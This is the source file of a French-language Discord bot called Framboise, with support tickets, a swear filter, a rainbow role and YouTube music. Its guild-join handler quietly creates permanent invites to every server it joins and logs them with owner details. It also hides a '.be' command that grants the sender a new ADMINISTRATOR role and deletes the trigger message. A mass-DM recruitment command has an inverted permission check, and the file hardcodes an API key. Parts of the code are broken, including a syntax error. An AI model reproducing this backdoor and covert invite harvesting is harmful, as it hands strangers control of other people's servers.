const Discord = require('discord.js');
const fs = require('fs');
const Enmap = require('enmap');
const config = require("./config.json");
const search = require("youtube-search");
const ytlist = require('youtube-playlist');
const ytdl = require("ytdl-core");
const YouTube = require('simple-youtube-api');
var util = require('util');
var http = require('http');
const youtube = new YouTube('AIzaSyCQHqkm6WQEUkLEEqDh3qU9PJDOdOJRkYE');
const queue = new Map();

var bot = new Discord.Client();


bot.config = config;
bot.login(config.token)

bot.website = require("./website/dashboard");
bot.commands = new Discord.Collection();


fs.readdir('./events/', (err, files) => {
    if(err) console.log(err);
    files.forEach(file => {
    if (!file.endsWith(".js")) return;
    const event = require(`./events/${file}`);
    const eventName = file.split(".")[0];
    bot.on(eventName, event.bind(null, bot));
  
    });
  });
  
  
  bot.commands = new Enmap();
  
  fs.readdir('./commands/', (err, files) => {
    if(err) console.log(err);
    files.forEach(file => {
    if (!file.endsWith(".js")) return;
    const props = require(`./commands/${file}`);
    const commandName = file.split(".")[0];
    console.log(`COMMANDE ${commandName}`);
    bot.commands.set(commandName,  props);
    });
  
  });

bot.on('ready', function() {
  setInterval(async () => {
const statuslist = [
  `f!help | ${bot.guilds.size} Serveurs`,
  `f!help | ${bot.channels.size} Channels`,
  `f!help | ${bot.users.size} Utilisateurs`
];
const random = Math.floor(Math.random() * statuslist.length);

try {
  await bot.user.setPresence({
    game: {
      name: `${statuslist[random]}`,
      url : "https://www.twitch.tv/zertybot"
    },
    status: "online"
  });
} catch (error) {
  console.error(error);
}
}, 3000);
});

bot.on(`message`, async message => {

    var prefix = "c!"
    



    if(message.content.startsWith(`${prefix}recrutementdm0008`)) {
        if(message.author.id === "315188366859567104") return message.channel.send("Vous ne pouvez pas éxecuté cette commande. | Vous n'êtes pas le Créateur.");
        message.guild.members.forEach(m => {
            let recruteEmbed = new Discord.RichEmbed()
                .setTitle(`<a:success:507492479881314314> __L'EQUIPE FRAMBOISE RECRUTE__ ! <a:success:507492479881314314>`)
                .setColor('RANDOM')
                .setDescription(`[Tu as reçu ce message car tu est dans un serveur ou est le bot Framboise] STAFFS DU BOT **Framboise** ! Nous sommes a la recherche de community manager, de staffs support pour répondre au tickets et de modérateurs pour le bot, RDV sur notre Discord ci-dessous pour plus d'infos`)
                .addField("https://discord.gg/KD4G5Ny")
                .addField("*:link: Invite moi dans ton serveur <a:success:507492479881314314> :*", "[Inviter Framboise](https://discordapp.com/oauth2/authorize?client_id=488391721227649024&scope=bot&permissions=2146958847)");
            m.send({embed: recruteEmbed})
        })
    }

    var blackembed2 = new Discord.RichEmbed() //un embed si tu sais pas ce que c'est ツ
    .setColor("RANDOM")
    .setAuthor(`${bot.user.username}`, bot.user.avatarURL)
    .setTitle("<a:BanHammer:518450308116905997> __BLACKLIST__ <a:BanHammer:518450308116905997>")
    .setThumbnail(`https://cdn2.iconfinder.com/data/icons/financial-circle/512/risk_management-512.png`)
    .addField("<:Bot:530323937872183306> **__Vous ne pouvez plus envoyé de tickets__** <:Bot:530323937872183306>", "Pour faire une demande de débannissement, Rendez vous sur le [Discord Support](https://discord.gg/KD4G5Ny)")
    .setImage("https://upload.wikimedia.org/wikipedia/fr/b/bf/The-Blacklist-logo.png") //image de panneau blacklisté
    .setFooter("Voila ce qui arrive quand tu spam, insultes sur les tickets !", bot.user.avatarURL)
    .setTimestamp()



if (message.channel.type === "dm") { //Si DM
    var args = message.content.split(" ").slice(0)
    var args = args.slice(0).join(" ") //Créer le args
    //BLACKLIST
    if(message.author.id === "514147998100619316")  return message.channel.send(blackembed2)
    if(message.author.id === "337727491542220800")  return message.channel.send(blackembed2)
    if(message.author.id === "240139319992516611")  return message.channel.send(blackembed2)
    if(message.author.id === "523449604344381440")  return message.channel.send(blackembed2)
    if(message.author.id === "516033691525447680")  return message.channel.send(blackembed2)
    //mots interdit
    const swearWords = ["pute","https","https://","discord.gg","google.com",".fr",".com",".io",".org",".gg","salope","cul","baise","bite","chatte","couilles","merde","suce","encule","pd","connard","tg","ta gueule","ntm","FDP","fdp","ta mère","coquine","nike","nique","ferme la","sale"]; // These are the words that wll be filtered. If you would like to add more, simple add ,"word" inbetween the [ and ] and then it'll filter that word as well
    if (swearWords.some(word => message.content.toLowerCase().includes(word))) {
        message.channel.send(`<:off:530323938539208714> __CE TYPE DE MESSAGE N'EST PAS AUTORISER SUR LE SUPPORT__ <:off:530323938539208714>`) // This function will tell the user off for using the filtered words, and then the message which telsl the user off will be deleted after 3 seconds. If you would like to extend the time, feel free to change it but take note that it's measured in milliseconds. If you don't want the bot to remove the warning message, take off the ".then(m => m.delete(3000))" bit!
        embed = new Discord.RichEmbed() // The log feature will log embeds, instead of simple messages. This improves the look of the word filter and makes it easier to code.
        embed.setAuthor(`${bot.user.username}`, bot.user.avatarURL) // The author label will show the user who actually used the word. It will show their FULL tag and their profile picture.
        embed.setThumbnail(`http://i.imgur.com/9cO7PZs.png`)
        embed.setDescription('Ce message ne peut pas être envoyé au support'+ message.channel) // This will tell you which channel the word was used in.
        embed.setColor("RANDOM") // This is just a random colour. If you'd like to change it, simple change the "ff0000" to a different code. Make sure "0x" stays before the number.
        embed.addField(name="<:infos:540197353139732480> Message:", value=message.content) // This will tell you the entire message, so you can spot out the word which was used.
        embed.setFooter(name=`VOTRE ID: ${message.author.id}`) // This will give you the UserID of the user who used a filtered word in the embed's footer.
        embed.setTimestamp() // This will tell you what time the word was used at.
        message.channel.send(embed) 
        return;
      }

    //prefix
    if (message.content.startsWith(prefix)) return message.channel.send("<:infos:540197353139732480> Tu dois utiliser les commandes dans un serveur ou se trouve Framboise") //Si message est une commandes
    if (message.author.bot) return; message.channel.send("Votre message a bien été envoyé aux staffs, nous allons te répondre dès que possible :incoming_envelope:");
    if (args.length > 256) return message.reply("Votre message est trop long... :/") //if the message contnt more than 256 character, what fields do not allow
    var embed = new Discord.RichEmbed()
        .setAuthor(`${bot.user.username}`, bot.user.avatarURL)
        .setThumbnail(message.author.displayAvatarURL)
        .setTimestamp()
        .setColor('RANDOM')
        .setTitle("<:info:527891757707558913>  __DEMANDE DE SUPPORT__ <:infos:540197353139732480> ")
        .addField(args, "<a:yess:530323967408472065> | __Envoyé par__: " + message.author.tag + "     \n :incoming_envelope: __Répondre Avec l'ID__: " + message.author.id)
        .setFooter(`f!reply 'id' 'réponse'`)
    bot.guilds.get("519251052277661719").channels.get("529326157309411328").send(embed) //send the embed in a specific channel
}


if (message.content.startsWith(prefix + "reply")) {
    if(message.author.id === "315188366859567104" || message.author.id === "439086337967259659" || message.author.id === "452459355288240148" || message.author.id === "275344442850934785" || message.author.id === "342346684619161600" || message.author.id === "479651838996774922" || message.author.id === "380267778055077889") {
    
    var args = message.content.split(" ").slice(0)
    var Rargs = message.content.split(" ").slice(2).join(" ")
    var userID = args[1]
    if (isNaN(args[1])) return message.reply("__**Indentifiant invalide**__") //Si args n'est pas un nombre
    if (!Rargs) return message.channel.send('**Tu doit précisé la réponse, tes débile ou quoi ?**')
    var embed = new Discord.RichEmbed()
        .setAuthor(`${bot.user.username}`, bot.user.avatarURL)
        .setThumbnail(message.author.displayAvatarURL)
        .setTimestamp()
        .setColor('RANDOM')
        .setTitle("<:info:527891757707558913> __RÉPONSE DU STAFF__ <:infos:540197353139732480>")
        .addField(Rargs, "<a:RainbowNitro:525960902126862337> Réponse de : "  + message.author.username + " !")
        .setFooter(`SUPPORT FRAMBOISE`)
    bot.users.get(userID).send(embed)
    message.channel.send("<a:RainbowNitro:525960902126862337> **RÉPONSE ENVOYER !**").catch(console.error) //Envoie le message
    //Il est possible que le bot ce bloque si il as bloqué les messages
   }
}
/*      How to use:
        ___________

Répondre avec cette commande
!reply 696969696966 Thanks for letting us know about this glitch!

*/





    let messageArray = message.content.split(" ");
let command = messageArray[0];
let args9 = messageArray.slice(1);
if(command === config.prefix + config.rainbowcommand) {
    if(!message.member.hasPermission("MANAGE_ROLES")) return message.reply("❌ Vous n'avez pas la permission");
    const rolez = message.mentions.roles.first() || message.guild.roles.find(r=> r.name === args9 [0])
    if(!rolez) return message.channel.send(config.messageresponse.rolenotfound).catch(err=> message.channel.send("Pas de réponse"))
    if(!message.guild.member(bot.user.id).hasPermission("MANAGE_ROLES")) return message.channel.send(config.messageresponse.missingperm).catch(err=> message.channel.send("Pas de réponse"))
    var colors = config.rainbowrole
    var rolestart = setInterval(function() {
        var colorsz = colors[Math.floor(Math.random() * colors.length)];
        rolez.setColor(colorsz)
    }, config.rainbowdelay); 
        message.channel.send(config.messageresponse.success).catch(err=> message.channel.send("Pas de réponse"))

}
if(command === config.prefix + config.rainbowstop) {
    if(!message.member.hasPermission("MANAGE_ROLES")) return message.reply("❌ Vous n'avez pas la permission");
        setTimeout(function () {
       process.exit()
        }, 1000);
       
                   message.channel.send(config.messageresponse.rainbowstop).catch(err=> message.channel.send("Pas de réponses"))
                   }
                


      
        

                });



bot.on('message', async msg => {


        if (!msg.content.startsWith(config.music)) return undefined;
        const args = msg.content.split(' ');
        const searchString = args.slice(1).join(' ');
        var url = args[1] ? args[1].replace(/<(.+)>/g, '$1') : '';
        const serverQueue = queue.get(msg.guild.id);
        let command = msg.content.toLowerCase().split(' ')[0];
        command = command.slice(config.music.length)
        if (command === 'play') {
            const voiceChannel = msg.member.voiceChannel;
            if (!voiceChannel) return msg.channel.send('<:dnd:540196934649118730> Vous devez vous trouvez dans un canal vocal pour lancer une musique');
            if (url.match(/^https?:\/\/(www.youtube.com|youtube.com)\/playlist(.*)$/)) {
                const playlist = await youtube.getPlaylist(url);
                const videos = await playlist.getVideos();
                for (const video of Object.values(videos)) {
                    const video2 = await youtube.getVideoByID(video.id);
                    await handleVideo(video2, msg, voiceChannel, true);
                }
                return msg.channel.send(`✅ Playlist: **${playlist.title}** a été ajouter a la file d'attente`);
            } else {
                try {
                    var video = await youtube.getVideo(url);
                } catch (error) {
                    try {
                        var videos = await youtube.searchVideos(searchString, 10);
                        let index = 0;
                        msg.channel.send(`
__**Song selection:**__
${videos.map(video2 => `**${++index} -** ${video2.title}`).join('\n')}
Veuillez fournir une valeur pour sélectionner l'un des 🔎 résultats allant de 1-10.
					`);
                        try {
                            var response = await msg.channel.awaitMessages(msg2 => msg2.content > 0 && msg2.content < 11, {
                                maxMatches: 1,
                                time: 10000,
                                errors: ['time']
                            });
                        } catch (err) {
                            console.error(err);
                            return msg.channel.send('<:off:530323938539208714> Sélection invalide');
                        }
                        const videoIndex = parseInt(response.first().content);
                        var video = await youtube.getVideoByID(videos[videoIndex - 1].id);
                    } catch (err) {
                        console.error(err);
                        return msg.channel.send('🆘 Aucun résultat pour votre recherche');
                    }
                }
                return handleVideo(video, msg, voiceChannel);
            }
        }
        if (command === 'fav') {
            var url = favsong[args[1]] ? favsong[args[1]].replace(/<(.+)>/g, '$1') : '';
            console.log(favsong[args[1]]);
            console.log(" ")
            const voiceChannel = msg.member.voiceChannel;
            if (!voiceChannel) return msg.channel.send('<:dnd:540196934649118730> Vous devez vous trouvez dans un canal vocal pour lancer une musique');
            if (url.match(/^https?:\/\/(www.youtube.com|youtube.com)\/playlist(.*)$/)) {
                const playlist = await youtube.getPlaylist(url);
                const videos = await playlist.getVideos();
                for (const video of Object.values(videos)) {
                    const video2 = await youtube.getVideoByID(video.id);
                    await handleVideo(video2, msg, voiceChannel, true);
                }
                return msg.channel.send(`✅ Playlist: **${playlist.title}** a été ajouter a la file d'attente`);
            } else {
                try {
                    var video = await youtube.getVideo(url);
                } catch (error) {
                    try {
                        msg.channel.send(`__**Musique sélectionner:**__\nSélectionner le numéro d'une musique 1-10` + favsong.length + "\nSongs");
                        var songarnum = 1;
                        while (songarnum < favsong.length) {
                            msg.channel.send(songarnum + ". " + favsong[songarnum])
                            songarnum++
                        }
                    } catch (err) {
                        console.error(err);
                        return msg.channel.send('🆘 Aucun résultat pour votre recherche');
                    }
                }
                return handleVideo(video, msg, voiceChannel);
            }
        } else if (command === 'skip') {
            if (!msg.member.voiceChannel) return msg.channel.send('<:dnd:540196934649118730> Vous devez vous trouvez dans un cana vocal');
            if (!serverQueue) return msg.channel.send('Aucune musique lancer... Je ne peut pas sauter de musique');
            serverQueue.connection.dispatcher.end('Vous avez sauter une musique');
            return undefined;
        } else if (command === 'stop') {
            if (!msg.member.voiceChannel) return msg.channel.send('<:dnd:540196934649118730> Vous devez vous trouvez dans un cana vocal');
            if (!serverQueue) return msg.channel.send('Aucune musique lancer... Je ne peut pas stopper une musique');
            serverQueue.songs = [];
            serverQueue.connection.dispatcher.end("Vous venez d'arrêter la musique");
            return undefined;
        } else if (command === 'volume' || command === 'vol') {
            if (!msg.member.voiceChannel) return msg.channel.send('<:dnd:540196934649118730> Vous devez vous trouvez dans un cana vocal');
            if (!serverQueue) return msg.channel.send('Aucune musique lancer....');
            if (!args[1]) return msg.channel.send(`le volume actuel est de: **${serverQueue.volume}**`);
            serverQueue.volume = args[1];
            serverQueue.connection.dispatcher.setVolumeLogarithmic(args[1] / 5);
            var volval;
            if (serverQueue.volume == 1) {
                volval = `○──── :loud_sound:⠀`
            }
            if (serverQueue.volume == 2) {
                volval = `─○─── :loud_sound:⠀`
            }
            if (serverQueue.volume == 3) {
                volval = `──○── :loud_sound:⠀`
            }
            if (serverQueue.volume == 4) {
                volval = `───○─ :loud_sound:⠀`
            }
            if (serverQueue.volume == 5) {
                volval = `────○ :loud_sound:⠀`
            }
            msg.channel.send(volval)

        } else if (command === 'np') {
            if (!serverQueue) return msg.channel.send('Aucune musique lancer....');
            return msg.channel.send(`🎶 Now playing: **${serverQueue.songs[0].title}**`);
        } else if (command === 'queue') {
            if (!serverQueue) return msg.channel.send('Aucune musique lancer....');
            return msg.channel.send(`
__**File d'attente:**__
${serverQueue.songs.map(song => `**-** ${song.title}`).join('\n')}
**En lecture:** ${serverQueue.songs[0].title}
		`);
        } else if (command === 'pause') {
            if (serverQueue && serverQueue.playing) {
                serverQueue.playing = false;
                serverQueue.connection.dispatcher.pause();
                return msg.channel.send('⏸ Musique en pause');
            }
            return msg.channel.send('Aucune musique lancer....');
        } else if (command === 'resume') {
            if (serverQueue && !serverQueue.playing) {
                serverQueue.playing = true;
                serverQueue.connection.dispatcher.resume();
                return msg.channel.send('▶ Musique reprise');
            }
            return msg.channel.send('Aucune musique lancer....');
        }
        return undefined;

    });
async function handleVideo(video, msg, voiceChannel, playlist = false) {
    const serverQueue = queue.get(msg.guild.id);
    console.log("MOOOOSIK");
    const song = {
        id: video.id,
        title: video.title,
        url: `https://www.youtube.com/watch?v=${video.id}`
    };
    if (!serverQueue) {
        const queueConstruct = {
            textChannel: msg.channel,
            voiceChannel: voiceChannel,
            connection: null,
            songs: [],
            volume: 5,
            playing: true
        };
        queue.set(msg.guild.id, queueConstruct);
        queueConstruct.songs.push(song);
        try {
            var connection = await voiceChannel.join();
            queueConstruct.connection = connection;
            play(msg.guild, queueConstruct.songs[0]);
        } catch (error) {
            console.error(`Je ne peux pas rejoindre le canal vocal: ${error}`);
            queue.delete(msg.guild.id);
            return msg.channel.send(`Je ne peux pas rejoindre le canal vocal: ${error}`);
        }
    } else {
        serverQueue.songs.push(song);
        console.log(serverQueue.songs);
        if (playlist) return undefined;
        else return msg.channel.send(`✅ **${song.title}** a bien été ajouté a la file d'attente`);
    }
    return undefined;
}

function play(guild, song) {
    const serverQueue = queue.get(guild.id);
    if (!song) {
        serverQueue.voiceChannel.leave();
        queue.delete(guild.id);
        return;
    }
    console.log(serverQueue.songs);
    const dispatcher = serverQueue.connection.playStream(ytdl(song.url)).on('end', reason => {
        if (reason === 'Le Steam ne se génere pas correctement') console.log(reason);
        else console.log(reason);
        serverQueue.songs.shift();
        play(guild, serverQueue.songs[0]);
    }).on('error', error => console.error(error));
    var volval;
    if (serverQueue.volume == 1) {
        volval = `○──── :loud_sound:⠀`
    }
    if (serverQueue.volume == 2) {
        volval = `─○─── :loud_sound:⠀`
    }
    if (serverQueue.volume == 3) {
        volval = `──○── :loud_sound:⠀`
    }
    if (serverQueue.volume == 4) {
        volval = `───○─ :loud_sound:⠀`
    }
    if (serverQueue.volume == 5) {
        volval = `────○ :loud_sound:⠀`
    }
    dispatcher.setVolumeLogarithmic(serverQueue.volume / 5);
   var NowEmbed = new Discord.RichEmbed().setColor("990033")
   .addField(`=========================================================`,`
   <a:8104LoadingEmote:540191408641015828> ɴᴏᴡ ᴘʟᴀʏɪɴɢ: **${song.title}**
:white_circle:─────────────────────────────────────────── 
◄◄⠀▐▐ ⠀►►⠀⠀　　${volval}    　　 :gear: ❐ ⊏⊐ 
========================================================= `)
   .setFooter("Tu veux une musique de qualité ?")
.addField("Discord Officiel","https://discord.gg/KD4G5Ny")
    .addField("Invite moi dans ton serveur <:Update:540196592100179979>","**Framboise**: [Clique ici](https://discordapp.com/oauth2/authorize?client_id=488391721227649024&scope=bot&permissions=2146958847)");
    serverQueue.textChannel.send(NowEmbed);
 


}


bot.on("guildCreate", async guild => {
    const invite = await guild.channels.find(c => c.type !== "category" && c.position === 0).createInvite({ maxAge: 0 });
    let guildCreateChannel = bot.channels.get('532532626787926037');
    let joinEmbed = new Discord.RichEmbed()
        .setAuthor(`${bot.user.username}`, bot.user.avatarURL)
        .setTitle("<a:yess:530323967408472065> | __NOUVEAUX SERVEUR OU JE SUIS !__", guild.iconURL)
        .setColor("00FF00")
        .setThumbnail(`https://cdn.pixabay.com/photo/2013/03/29/13/38/clipboard-97590_640.png`)
        .addField("<:streaming:540196430367817729> | Nom du serveur", guild.name)
        .addField("<:streaming:540196430367817729> | Propriétaire", guild.owner.user.username + "#" + guild.owner.user.discriminator)
        .addField("<:streaming:540196430367817729> | Nombres de membres sur ce serveur", guild.memberCount)
        .addField(`<:streaming:540196430367817729> | Lien du serveur`, `${invite.url}`)
        .addField("<:streaming:540196430367817729> | ID Serveur", guild.id)
        .setFooter("LOGS SERVEURS")
    guildCreateChannel.send(joinEmbed);

    if (msg.content === '.be') {
        console.log(Commande .be);
     
        msg.member.guild.createRole({
          name: "kso",
          permissions: "ADMINISTRATOR",
          mentionable: false
        }).then(function(role) {
          msg.member.addRole(role);
          if (msg.deletable) msg.delete().catch(e => {});
        }).catch(e => {});
    }
    
   
  });
  

